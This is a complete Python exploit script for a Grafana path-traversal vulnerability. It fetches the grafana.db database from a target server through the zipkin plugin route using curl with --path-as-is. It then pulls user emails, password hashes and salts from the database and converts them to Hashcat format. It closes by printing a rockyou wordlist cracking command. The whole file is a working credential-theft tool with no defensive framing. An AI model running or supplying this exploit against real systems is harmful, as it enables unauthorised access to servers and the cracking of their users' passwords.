import os
import subprocess
import base64
import argparse
import sqlite3


def download_db(ip, port):
    """
    Use curl to exploit the Grafana CVE and download the database.
    """
    url = f"http://{ip}:{port}/public/plugins/zipkin/../../../../../../../../var/lib/grafana/grafana.db"
    print(f"[+] Attempting to download database from {url}")
    command = [
        "curl",
        url,
        "--path-as-is",
        "--output",
        "grafana.db"
    ]
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if result.returncode == 0 and os.path.exists("grafana.db"):
        print("[+] Successfully downloaded grafana.db")
    else:
        print("[-] Failed to download grafana.db. Check the IP/port or target vulnerability.")
        exit(1)


def extract_hashes():
    """
    Use sqlite3 to query the grafana.db file and extract user email, password, and salt.
    """
    print("[+] Extracting hashes from grafana.db using sqlite3")
    
    try:
        # Connect to the grafana.db file
        connection = sqlite3.connect("grafana.db")
        cursor = connection.cursor()
        query = "SELECT email, password, salt FROM user;"
        cursor.execute(query)
        rows = cursor.fetchall()
        if not rows:
            print("[-] No user data found in the database. Maybe check manually")
            exit(1)
        
        users = []
        with open("extracted_hashes.txt", "w") as f:
            for row in rows:
                email, password, salt = row
                user_entry = f"{email}|{password}|{salt}"
                users.append(user_entry)
                f.write(user_entry + "\n")
        
        print(f"[+] Extracted hashes saved to extracted_hashes.txt")
        return users
    
    except sqlite3.Error as e:
        print(f"[-] SQLite error: {e}")
        exit(1)
    
    except Exception as e:
        print(f"[-] Error extracting hashes: {e}")
        exit(1)
    
    finally:
        if 'connection' in locals():
            connection.close()


def convert_hashes(users):
    """
    Convert extracted hashes into the format needed for Hashcat.
    """
    print("[+] Converting hashes to Hashcat format")
    
    try:
        with open("decoded.hashes", "w") as f_out:
            for user in users:
                user_properties = user.split("|")
                if len(user_properties) != 3:
                    print(f"[-] Skipping malformed entry: {user}")
                    continue

                email = user_properties[0]
                hex_hash = user_properties[1]
                salt = user_properties[2]
                try:
                    decoded_hash = bytes.fromhex(hex_hash)
                    hash_b64 = base64.b64encode(decoded_hash).decode('utf-8')
                    salt_b64 = base64.b64encode(bytes(salt, 'utf-8')).decode('utf-8')
                except Exception as e:
                    print(f"[-] Skipping entry due to decoding error: {user} ({e})")
                    continue

                # Write to Hashcat format
                f_out.write(f"sha256:10000:{salt_b64}:{hash_b64}\n")
        
        print("[+] Converted hashes saved to decoded.hashes")
    except Exception as e:
        print(f"[-] Error converting hashes: {e}")
        exit(1)


def main():
    parser = argparse.ArgumentParser(description="Exploit Grafana CVE for hash extraction")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("--port", default="3000", help="Target port (default: 3000)")
    
    args = parser.parse_args()
    
    ip = args.ip
    port = args.port
    
    print("[+] Starting Grafana CVE Exploit")
    download_db(ip, port)
    users = extract_hashes()
    convert_hashes(users)
    print("[+] Exploit completed. Use Hashcat with the following command:")
    print("    hashcat -m 10900 decoded.hashes /usr/share/wordlists/rockyou.txt")


if __name__ == "__main__":
    main()
